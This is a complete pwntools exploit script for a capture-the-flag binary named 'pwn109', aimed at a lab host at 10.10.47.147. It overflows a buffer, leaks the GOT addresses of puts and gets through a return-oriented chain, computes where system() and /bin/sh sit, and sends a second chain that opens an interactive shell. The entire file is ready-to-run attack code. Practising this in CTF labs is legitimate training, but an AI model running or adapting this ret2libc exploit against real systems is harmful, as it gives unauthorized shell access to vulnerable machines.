from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.47.147', 9009)
    else:
        r = process('./pwn109.pwn109')
    
    libc = ELF('./pwn109.pwn109', checksec=False)
    pop_rdi = 0x4012a3
    ret = 0x40101a

    payload = b'A' * 40
    # Get the GOT address of puts()
    payload += p64(pop_rdi)
    payload += p64(libc.got['puts'])                    # get the GOT address
    payload += p64(libc.plt['puts'])                    # print the GOT address

    # Get the GOT address of get()
    payload += p64(pop_rdi)
    payload += p64(libc.got['gets'])                    # get the GOT address
    payload += p64(libc.plt['puts'])                    # print the GOT address
    payload += p64(libc.symbols['main'])                # Exploit again

    r.recvuntil('ahead')
    r.recv()
    r.sendline(payload)

    got_puts = u64(r.recv(10).strip().ljust(8, b'\x00'))
    got_gets = u64(r.recv(10).strip().ljust(8, b'\x00'))

    log.success(f"Success!!! The GOT address of puts() is: {hex(got_puts)}")
    log.success(f"Success!!! The GOT address of gets() is: {hex(got_gets)}")

    system_addr = got_puts - 0x31550
    binsh_addr = got_puts + 0x13337a

    log.info(f'The address of system(): {hex(system_addr)}')
    log.info(f'The address of /bin/sh: {hex(binsh_addr)}')

    payload = b'A'*40
    # payload += p64(ret)           # Align the stack if error (option)
    payload += p64(pop_rdi)         # Call system("/bin/sh")
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    r.recvuntil('ahead')
    r.recv()
    r.sendline(payload)

    r.interactive()

exploit(True)